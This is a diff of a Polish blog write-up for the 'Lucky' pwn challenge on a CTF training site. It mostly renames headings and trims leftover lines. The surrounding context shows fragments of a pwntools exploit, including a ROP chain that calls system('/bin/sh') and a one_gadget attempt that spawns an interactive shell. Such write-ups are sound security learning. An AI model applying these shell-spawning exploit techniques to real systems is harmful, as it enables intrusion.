@@ -25,9 +25,7 @@ header:
 |Task:|[Lucky](https://flagyard.com/labs/training-labs/5/challenges/036364b3-9ea8-426f-80c5-0ef56eddc748)|
 |Category:|PWN|
 
-# 01. Opis
-## Wstęp
-Oto poprawiona wersja Twojego tekstu:
+# Wstęp
 
 Dawno nie pisałem po polsku, więc dla odmiany coś napiszę. A jak... 😉 Zadanie Lucky należy do kategorii easy, ale dawno nie robiłem czegoś tak podstępnego i trudnego dla mnie. Wracałem do niego wielokrotnie i nie mogłem ruszyć dalej. Gdy już udało się coś osiągnąć, okazywało się, że to dopiero połowa drogi... albo i mniej. Solucji oczywiście brak – możliwe, że to pierwsze takie podejście? Pytałem innych o hinty dotyczące tego zadania, bo wiele osób je ukończyło, ale nie wiedziało jak – mieli tylko flagę. A po co mi flaga, skoro nie wiem, jak to zrobić?
 
@@ -74,7 +72,7 @@ Enter new number: 1
 ## Opis techniczny
 Po wykonaniu polecenia checksec okazuje się, że binarka posiada praktycznie cały zestaw zabezpieczeń, z wyjątkiem canary.
 {: .text-justify}
-### **Checksec Results**
+### Checksec
 
 ```bash
 checksec --file=./lucky_patched
@@ -268,7 +266,7 @@ Idea jest taka, że znamy już adresy, ale musimy umieścić je na stosie, podaj
         p.sendlineafter(b'Enter new number:', low_bytes)
         p.sendlineafter(b'Enter new number:', high_bytes)
 ```
-# Payload z system (libc)
+## Payload z system (libc)
 OK, wrzucamy payload, ale coś nie działa. Dlaczego? Przecież wstawiamy pop rdi, a w rdi ustawiamy /bin/sh. Następny ROP to wywołanie system. Dlaczego to nie działa??? Nie wiem.
 {: .text-justify}
 ```bash
@@ -287,7 +285,7 @@ Continuing.
 [Inferior 1 (process 66286) detached]
 [Inferior 2 (process 66366) exited with code 0177]
 ```
-# Payload z one_gadget
+## Payload z one_gadget
 Spróbujmy z `one_gadget`. Jest! Tylko trzeba wyzerowac `R12`, ale na to jest jakiś `ROP`.
 {: .text-justify}
 ```bash
@@ -306,7 +304,7 @@ constraints:
   [rsi] == NULL || rsi == NULL || rsi is a valid argv
   [rdx] == NULL || rdx == NULL || rdx is a valid envp
 ```
-# Rozwiązanie
+# Exploit
 ```py
 from pwn import *             
 #context.log_level='debug'    
@@ -394,16 +392,10 @@ info (f"ID: {ID}")
 ID=enter_name(b"\xd3"*41) #to 0
 info (f"ID: {ID}")
 
-#brva 0x1407 #troche
-# gdb.attach(p, '''
-# brva 0x151c
-# ''')
-# pause (3)
-
 set_payload ()
 p.interactive()
 ```
-## Summary
+# Podsumowanie
 Flagę pominę, bo możecie ją sami odtworzyć. Co do zadania – było ono jednocześnie męczące, frustrujące i... satysfakcjonujące. To na pewno nie było easy. Gdy w końcu zdobyłem flagę, polubiłem to zadanie. Wcześniej go nienawidziłem. To nie było szczęśliwe zadanie ;)
 {: .text-justify}
 
